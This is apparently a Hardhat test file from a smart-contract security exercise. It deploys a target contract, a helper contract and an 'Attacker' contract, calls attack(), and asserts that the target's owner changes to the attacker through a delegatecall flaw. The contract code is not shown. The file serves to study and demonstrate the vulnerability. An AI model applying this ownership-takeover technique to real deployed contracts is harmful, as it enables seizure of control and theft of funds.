const {ethers} = require('hardhat');
const {expect} = require('chai');

describe("delegate-call attack", function() {
    it("targetContract's owner address should change", async function() {
        
        const thirdContractFactory = await ethers.getContractFactory("ThirdContract");
        const thirdContract = await thirdContractFactory.deploy();
        await thirdContract.deployed();
        console.log('thirdContract address: ', thirdContract.address);

        const targetContractFactory = await ethers.getContractFactory("TargetContract");
        const targetContract = await targetContractFactory.deploy(thirdContract.address);
        await targetContract.deployed();
        console.log('targetContract address: ', targetContract.address);

        const AttackerContractFactory = await ethers.getContractFactory("Attacker");
        const attackerContract = await AttackerContractFactory.deploy(targetContract.address);
        await attackerContract.deployed();
        console.log('attacker address: ', attackerContract.address);

        let tx = await attackerContract.attack();
        await tx.wait();

        expect(await targetContract.owner()).to.equal(attackerContract.address);
    });
});